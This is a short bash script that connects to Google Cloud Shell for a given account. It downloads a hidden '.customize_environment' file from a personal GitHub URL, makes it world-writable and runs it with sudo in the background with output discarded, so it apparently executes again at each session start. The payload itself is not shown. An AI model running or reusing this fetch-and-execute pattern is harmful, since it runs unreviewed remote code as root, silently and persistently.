#!/bin/bash

command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

gcloud cloud-shell ssh --command="$command" --authorize-session --force-key-file-overwrite --quiet --account=$1

echo 'command ok'
